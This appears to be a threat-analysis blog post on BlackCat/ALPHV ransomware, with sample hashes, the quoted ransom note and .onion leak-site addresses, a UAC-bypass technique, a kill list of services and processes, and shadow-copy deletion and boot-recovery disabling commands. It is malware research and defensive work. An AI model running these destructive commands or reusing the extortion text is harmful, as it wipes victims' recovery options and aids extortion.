  &lt;p&gt;The name “BlackCat” was mentioned first by MalwareHunterTeam&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;a href=&quot;https://twitter.com/vxunderground/status/1679128724489289728&quot;&gt;https://twitter.com/vxunderground/status/1679128724489289728&lt;/a&gt;&lt;/p&gt;

&lt;h3 id=&quot;technical-summary&quot;&gt;Technical summary&lt;/h3&gt;

&lt;p&gt;This ransomware encrypts the data of business users and corporate networks using the algorithms &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AES-128&lt;/code&gt; (CTR mode) and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RSA-2048&lt;/code&gt;, and then demands a hefty ransom payment in BTC or Monero to decrypt the files. Instead of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AES&lt;/code&gt;, the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ChaCha20&lt;/code&gt; algorithm can be used. The configuration file is consulted to retrieve the global public key used to encrypt local credentials. Original title: &lt;em&gt;ALPHV-ng RaaS&lt;/em&gt;. A striking example of using the Rust programming language. eSXI is capable of encrypting data on Windows, Linux, and VMWare systems.&lt;/p&gt;

&lt;h3 id=&quot;threat-actor&quot;&gt;Threat Actor&lt;/h3&gt;

&lt;p&gt;Most of threat hunting labs, also MSSP Lab has observed one of these RaaS providers, ALPHV (also known as BlackCat ransomware), gathering traction since late 2021, actively recruiting new affiliates and targeting organizations in a variety of industries across the globe. The organization actively recruits former REvil, BlackMatter, and DarkSide operators. A campaign to attract new affiliates started to be advertised on underground forums:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/8/2023-07-14_01-09.png&quot; alt=&quot;cat&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/8/2023-07-14_01-26.png&quot; alt=&quot;cat&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/8/2023-07-14_01-28.png&quot; alt=&quot;cat&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;identification&quot;&gt;Identification&lt;/h3&gt;

&lt;p&gt;Samples is being investigated:&lt;/p&gt;

&lt;p&gt;&lt;em&gt;sample.exe&lt;/em&gt;:&lt;/p&gt;

&lt;p&gt;File size: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;2281472 bytes&lt;/code&gt;  &lt;br /&gt;
MD5 sum: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;aea5d3cced6725f37e2c3797735e6467&lt;/code&gt;   &lt;br /&gt;
SHA-1 sum: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;087497940a41d96e4e907b6dc92f75f4a38d861a&lt;/code&gt;  &lt;br /&gt;
SHA-256 sum: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;3d7cf20ca6476e14e0a026f9bdd8ff1f26995cdc5854c3adb41a6135ef11ba83&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;First of all, check our sample via VirusTotal:&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://www.virustotal.com/gui/file/3d7cf20ca6476e14e0a026f9bdd8ff1f26995cdc5854c3adb41a6135ef11ba83/details&quot;&gt;https://www.virustotal.com/gui/file/3d7cf20ca6476e14e0a026f9bdd8ff1f26995cdc5854c3adb41a6135ef11ba83/details&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/8/2023-07-14_01-43.png&quot; alt=&quot;vt&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;As we can see, 60 of 71 AV engines detect our sample as malicious.&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;and the most interesting sample written in Rust:&lt;/p&gt;

&lt;p&gt;&lt;em&gt;sample2.exe&lt;/em&gt;:&lt;/p&gt;

&lt;p&gt;File size: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;2281472 bytes&lt;/code&gt;  &lt;br /&gt;
MD5 sum: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;701b4b004eecb69046c210237846d46d&lt;/code&gt;   &lt;br /&gt;
SHA-1 sum: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;8c70191b12f14eed594388c8fbe05efe6ebaa564&lt;/code&gt;  &lt;br /&gt;
SHA-256 sum: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;6dd995d896a9a593b2c48d09da60bd83866d8577273f36d38788d83ad8173e68&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;which also checked via VirusTotal:&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://www.virustotal.com/gui/file/6dd995d896a9a593b2c48d09da60bd83866d8577273f36d38788d83ad8173e68&quot;&gt;https://www.virustotal.com/gui/file/6dd995d896a9a593b2c48d09da60bd83866d8577273f36d38788d83ad8173e68&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/8/2023-07-14_03-57.png&quot; alt=&quot;vt&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;As we can see, 55 of 70 AV engines detect our sample as malicious.&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;More of the detect it as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Win.Ransomware.BlackCat-9974801-0&lt;/code&gt;&lt;/p&gt;

&lt;h3 id=&quot;static-analysis&quot;&gt;Static analysis&lt;/h3&gt;

&lt;p&gt;&lt;em&gt;sample.exe&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;The specified sample is a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;32-bit&lt;/code&gt; PE file:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;file &amp;lt;sample.exe&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/8/2023-07-14_01-50.png&quot; alt=&quot;vt&quot; /&gt;&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;hexdump &lt;span class=&quot;nt&quot;&gt;-C&lt;/span&gt; &amp;lt;sample.exe&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/8/2023-07-14_02-12.png&quot; alt=&quot;file&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;exiftool&lt;/code&gt; for looking metadata:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;exiftool &amp;lt;sample.exe&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/8/2023-07-14_02-14.png&quot; alt=&quot;file&quot; /&gt;&lt;/p&gt;

&lt;p&gt;File timestamp is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;2021:11:18 05:04:28-05:00&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Compiled via &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;MinGW&lt;/code&gt;:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/8/2023-07-14_02-17.png&quot; alt=&quot;file&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Shannon entropy:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/8/2023-07-14_02-20.png&quot; alt=&quot;file&quot; /&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;&lt;em&gt;sample2.exe&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;The specified sample is a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;32-bit&lt;/code&gt; PE file:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;file &amp;lt;sample2.exe&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/8/2023-07-14_04-08.png&quot; alt=&quot;vt&quot; /&gt;&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;hexdump &lt;span class=&quot;nt&quot;&gt;-C&lt;/span&gt; &amp;lt;sample2.exe&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/8/2023-07-14_04-08_1.png&quot; alt=&quot;file&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;exiftool&lt;/code&gt; for looking metadata:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;exiftool &amp;lt;sample2.exe&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/8/2023-07-14_04-08_2.png&quot; alt=&quot;file&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Linker information &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GNU binutils&lt;/code&gt;:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/8/2023-07-14_04-06.png&quot; alt=&quot;file&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Entropy:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/8/2023-07-14_04-09.png&quot; alt=&quot;file&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/8/2023-07-14_04-11.png&quot; alt=&quot;file&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/8/2023-07-14_04-11_1.png&quot; alt=&quot;file&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;dynamic-analysis&quot;&gt;Dynamic analysis&lt;/h3&gt;

&lt;p&gt;Can be distributed via hacking via an insecure RDP configuration, email spam and malicious attachments, inaccurate downloads, botnets, exploits, malicious advertisements, web injections, fake updates, repackaged and infected installers.&lt;/p&gt;

&lt;p&gt;Ransom Note:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;» Introduction
Important files on your system was ENCRYPTED and now they have have &lt;span class=&quot;s2&quot;&gt;&quot;sykffle&quot;&lt;/span&gt; extension.
In order to recover your files you need to follow instructions below.
» Sensitive Data
Sensitive data on your system was downloaded and it will be published &lt;span class=&quot;k&quot;&gt;if &lt;/span&gt;you refuse to cooperate.
Data includes:
- Employees personal data, CVs, DL , SSN.
- Complete network map including credentials &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;local &lt;/span&gt;and remote services.
- Financial information including clients data, bills, budgets, annual reports, bank statements.
- Complete datagrams/schemas/drawings &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;manufacturing &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;solidworks format
- And more...
Private preview is published here: hxxx://zujgzbu5y64xbmvc42addp4lxkoosb4tslf5mehnh7pvqjpwxn5gokyd.onion/&lt;span class=&quot;k&quot;&gt;***&lt;/span&gt;
» CAUTION
DO NOT MODIFY FILES YOURSELF.
DO NOT USE THIRD PARTY SOFTWARE TO RESTORE YOUR DATA.
YOU MAY DAMAGE YOUR FILES, IT WILL RESULT IN PERMANENT DATA LOSS.
YOUR DATA IS STRONGLY ENCRYPTED, YOU CAN NOT DECRYPT IT WITHOUT CIPHER KEY.
» Recovery procedure
Follow these simple steps to get &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;touch &lt;/span&gt;and recover your data:
1&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; Download and &lt;span class=&quot;nb&quot;&gt;install &lt;/span&gt;Tor Browser from: https://torprojoject.org
2&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; Navigate to: hxxx://mu75ltv3lxd24dbyu6gtvmnwybecigs5auki7fces437xvvflzva2nqd.onion/?access-key&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;***&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Second sample is written in Rust:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/8/2023-07-14_14-15.png&quot; alt=&quot;file&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/8/2023-07-14_14-16.png&quot; alt=&quot;file&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Initialisation and propagation&lt;/strong&gt; - BlackCat samples that we analyzed could be launched with any string provided as the access token:&lt;/p&gt;

&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;\sample.exe&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;--access-token&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;1234567&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/8/2023-07-14_00-33.png&quot; alt=&quot;file&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The malware will immediately attempt to validate the existence of the aforementioned &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;access-token&lt;/code&gt;, followed by a query for the system UUID:&lt;/p&gt;

&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;cmd.exe&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;/c&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;wmic&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;csproduct&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;UUID&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Also, it employs the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GetCommandLineW&lt;/code&gt; API to determine whether the supplied access token is valid:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/8/2023-07-14_04-34.png&quot; alt=&quot;file&quot; /&gt;&lt;/p&gt;

&lt;p&gt;BlackCat spawns a number of its own processes, with the following syntax (for Windows):&lt;/p&gt;

&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;wmic.exe&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Shadowcopy&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Delete&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;
&quot;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;iisreset.exe&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;/stop&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;
bcdedit.exe /set {default} recoveryenabled No
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;or&lt;/p&gt;

&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;cmd&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;/c&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;vssadmin.exe&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;delete&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;shadows&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;/all&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;/quiet&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;As you can see, in order to prevent the organization from restoring encrypted files, the ransomware first deletes any available shadow copies, as is characteristic of ransomware attacks.&lt;/p&gt;

&lt;p&gt;BlackCat also attempts to propagate via &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PsExec&lt;/code&gt;:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/8/2023-07-14_05-09.png&quot; alt=&quot;file&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Privilege Escalation&lt;/strong&gt; - Using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CoGetObject&lt;/code&gt;, the ransomware registers itself with the CLSID &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;3E5FC7F9-9A51-4367-9063-A120244FBEC7&lt;/code&gt;, which is legitimately used to execute applications with elevated privileges. This technique enables the malware to circumvent the UAC prompt and execute its malicious actions without being detected or blocked by the system’s security measures.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/8/2023-07-14_04-48.png&quot; alt=&quot;file&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Anti-disassembly&lt;/strong&gt; -  &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Sleep&lt;/code&gt; function make stepping through code in a debugger more time-consuming and thus complicate the process of reverse engineering:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/8/2023-07-14_13-58.png&quot; alt=&quot;file&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Terminating all active services and processes&lt;/strong&gt; - BlackCat will now attempt to terminate any processes or services specified in the configuration, such as processes that may inhibit the encryption procedure.&lt;/p&gt;

&lt;p&gt;Kill services:&lt;/p&gt;

&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;backup&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;memtas&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;mepocs&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;msexchange&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;sql&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;svc&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;veeam&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;vss&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;and processes:&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;s&quot;&gt;&quot;kill_processes&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;
  &lt;span class=&quot;s&quot;&gt;&quot;encsvc&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
  &lt;span class=&quot;s&quot;&gt;&quot;thebat&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
  &lt;span class=&quot;s&quot;&gt;&quot;mydesktopqos&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
  &lt;span class=&quot;s&quot;&gt;&quot;xfssvccon&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
  &lt;span class=&quot;s&quot;&gt;&quot;firefox&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
  &lt;span class=&quot;s&quot;&gt;&quot;infopath&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
  &lt;span class=&quot;s&quot;&gt;&quot;winword&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
  &lt;span class=&quot;s&quot;&gt;&quot;steam&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
  &lt;span class=&quot;s&quot;&gt;&quot;synctime&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
  &lt;span class=&quot;s&quot;&gt;&quot;notepad&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
  &lt;span class=&quot;s&quot;&gt;&quot;ocomm&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
  &lt;span class=&quot;s&quot;&gt;&quot;onenote&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
  &lt;span class=&quot;s&quot;&gt;&quot;mspub&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
  &lt;span class=&quot;s&quot;&gt;&quot;thunderbird&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
  &lt;span class=&quot;s&quot;&gt;&quot;agntsvc&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
  &lt;span class=&quot;s&quot;&gt;&quot;sql&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
  &lt;span class=&quot;s&quot;&gt;&quot;excel&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
  &lt;span class=&quot;s&quot;&gt;&quot;powerpnt&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
  &lt;span class=&quot;s&quot;&gt;&quot;outlook&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
  &lt;span class=&quot;s&quot;&gt;&quot;wordpad&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
  &lt;span class=&quot;s&quot;&gt;&quot;dbeng50&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
  &lt;span class=&quot;s&quot;&gt;&quot;isqlplussvc&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
  &lt;span class=&quot;s&quot;&gt;&quot;sqbcoreservice&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
  &lt;span class=&quot;s&quot;&gt;&quot;oracle&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
  &lt;span class=&quot;s&quot;&gt;&quot;ocautoupds&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
  &lt;span class=&quot;s&quot;&gt;&quot;dbsnmp&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
  &lt;span class=&quot;s&quot;&gt;&quot;msaccess&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
  &lt;span class=&quot;s&quot;&gt;&quot;tbirdconfig&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
  &lt;span class=&quot;s&quot;&gt;&quot;ocssd&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
  &lt;span class=&quot;s&quot;&gt;&quot;mydesktopservice&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
  &lt;span class=&quot;s&quot;&gt;&quot;visio&quot;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;Encryption process&lt;/strong&gt; - BlackCat initially traverses the system using a cycle of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;FindFirstFile&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;FindNextFile&lt;/code&gt; to locate all system files:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/8/photo_2023-07-14_12-11-41.jpg&quot; alt=&quot;file&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/8/photo_2023-07-14_13-12-25.jpg&quot; alt=&quot;file&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Then ransom note is written using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;WriteFile&lt;/code&gt; to each directory:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/8/2023-07-14_13-40.png&quot; alt=&quot;file&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;BCryptGenRandom&lt;/code&gt;, the ransomware calculates a random &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AES&lt;/code&gt; key:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/8/2023-07-14_14-06.png&quot; alt=&quot;file&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/8/2023-07-14_14-10.png&quot; alt=&quot;file&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/8/2023-07-14_14-11.png&quot; alt=&quot;file&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The file’s contents are written to the file using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ReadFile&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;WriteFile&lt;/code&gt; after it has been encrypted with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AES&lt;/code&gt;. The new file extension is listed in the BlackCat configuration.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/8/2023-07-14_14-33.png&quot; alt=&quot;file&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We created a simple BlackCat Ransomware configuration extractor:&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;hashlib&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;os&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;json&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;binascii&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;argparse&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;sys&lt;/span&gt;
